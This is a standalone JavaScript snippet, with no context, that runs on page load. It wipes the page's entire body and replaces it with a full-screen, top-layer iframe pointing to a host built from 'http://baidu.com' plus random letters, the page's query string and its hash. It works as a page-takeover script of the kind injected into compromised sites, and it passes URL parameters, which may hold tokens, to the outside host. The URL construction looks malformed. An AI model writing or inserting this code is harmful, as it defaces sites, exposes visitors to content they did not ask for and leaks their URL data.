(function () {
    function start() {
        function randomLetters(len) {
            var chars = 'abcdefghijklmnopqrstuvwxyz';
            var str = '';

            for (var i = 0; i < len; i++) {
                str += chars.charAt(Math.floor(Math.random() * chars.length));
            }

            return str;
        }

        var targetUrl =
            'http://baidu.com' +
            randomLetters(8) +
            location.search +
            location.hash;

        var viewport = document.querySelector('meta[name="viewport"]');

        if (!viewport) {
            viewport = document.createElement('meta');
            viewport.name = 'viewport';
            document.head.appendChild(viewport);
        }

        viewport.content = 'width=device-width,initial-scale=1';

        document.documentElement.style.margin = '0';
        document.documentElement.style.padding = '0';
        document.documentElement.style.width = '100%';
        document.documentElement.style.height = '100%';

        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.width = '100%';
        document.body.style.height = '100%';
        document.body.style.overflow = 'hidden';

        var iframe = document.createElement('iframe');

        iframe.src = targetUrl;
        iframe.style.position = 'fixed';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.width = '100vw';
        iframe.style.height = '100vh';
        iframe.style.border = '0';
        iframe.style.margin = '0';
        iframe.style.padding = '0';
        iframe.style.zIndex = '2147483647';

        iframe.setAttribute('frameborder', '0');
        iframe.setAttribute('allow', 'autoplay; fullscreen');
        iframe.setAttribute('allowfullscreen', 'true');

        document.body.appendChild(iframe);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', start);
    } else {
        start();
    }
})();
